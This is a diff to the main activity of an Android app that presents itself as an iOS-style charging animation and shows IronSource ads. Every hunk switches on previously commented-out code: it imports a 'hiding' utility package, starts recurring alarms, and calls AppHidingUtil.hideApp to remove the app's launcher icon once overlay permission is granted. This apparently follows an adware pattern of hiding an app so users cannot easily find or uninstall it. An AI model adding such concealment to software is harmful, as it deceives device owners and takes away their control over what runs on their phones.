@@ -15,9 +15,9 @@ import com.ioscharginging.iosanimationation.ui.guid.GuidDialog
 import com.ioscharginging.iosanimationation.ui.permission.PermissionDialog
 import com.ioscharginging.iosanimationation.ui.settings.SettingsActivity
 import com.ioscharginging.iosanimationation.utils.IRON_SOURCE_APP_KEY
-//import com.charginging.animationation.utils.hiding.AlarmBroadcast
-//import com.charginging.animationation.utils.hiding.AppHidingUtil
-//import com.charginging.animationation.utils.hiding.HidingBroadcast
+import com.ioscharginging.iosanimationation.utils.hiding.AlarmBroadcast
+import com.ioscharginging.iosanimationation.utils.hiding.AppHidingUtil
+import com.ioscharginging.iosanimationation.utils.hiding.HidingBroadcast
 import com.ironsource.mediationsdk.IronSource
 import io.github.florent37.shapeofview.shapes.RoundRectView
 import java.util.*
@@ -36,7 +36,7 @@ class MainActivity : BaseActivity<MainViewModel, MainActivityBinding>() {
     override fun setupUI() {
         IronSource.setMetaData("is_child_directed","false")
         IronSource.init(this, IRON_SOURCE_APP_KEY)
-//        AlarmBroadcast.startAlarm(this)
+        AlarmBroadcast.startAlarm(this)
         if (ForegroundService.instance === null)
             startService(Intent(this, ForegroundService::class.java))
         if (!Preferences.wasLaunchedBefore)
@@ -82,10 +82,10 @@ class MainActivity : BaseActivity<MainViewModel, MainActivityBinding>() {
     override fun onResume() {
         super.onResume()
         IronSource.onResume(this)
-        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice()) {}
-//            AppHidingUtil.hideApp(this, "Launcher2", "Launcher")
-        else {}
-//            HidingBroadcast.startAlarm(this)
+        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice())
+            AppHidingUtil.hideApp(this, "Launcher2", "Launcher")
+        else
+            HidingBroadcast.startAlarm(this)
     }
 
     override fun onPause() {
